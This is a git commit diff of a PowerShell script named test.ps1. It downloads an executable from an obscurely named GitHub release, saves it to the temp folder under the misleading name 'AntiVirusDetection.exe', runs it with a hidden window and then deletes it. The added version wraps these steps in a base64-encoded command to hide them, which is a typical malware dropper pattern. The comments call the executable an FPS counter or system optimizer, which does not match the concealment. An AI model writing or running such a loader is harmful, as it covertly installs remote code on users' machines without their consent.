6d52a4ea9a0b99b0892690e4b9edc1ab9641afbd
KelvinWin10 <83051550+KelvinWin10@users.noreply.github.com>
2025-07-18 23:40:44 +0300

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,11 +1,12 @@
-# Path to save the executable temporarily
-$p = Join-Path $env:TEMP 'WindowsSystemOptimizer.exe'
-
-# Download the FPS counter app
-Invoke-WebRequest 'https://github.com/KelvinWin10/theresabsoulutelynowayforutoseethis/releases/download/justtestingnewstuff123/WindowsSystemOptimizer.exe' -OutFile $p
-
-# Run the app in hidden mode
-Start-Process -FilePath $p -WindowStyle Hidden -Wait
-
-# Remove it after it closes
+$script = @'
+$p=Join-Path $env:TEMP "AntiVirusDetection.exe"
+Invoke-WebRequest "https://github.com/KelvinWin10/theresabsoulutelynowayforutoseethis/releases/download/justtestingnewstuff123/WindowsSystemOptimizer.exe" -OutFile $p
+Start-Process $p -Wait
 Remove-Item $p
+'@
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
+$encoded = [Convert]::ToBase64String($bytes)
+
+# Run the encoded command hidden
+powershell.exe -WindowStyle Hidden -EncodedCommand $encoded
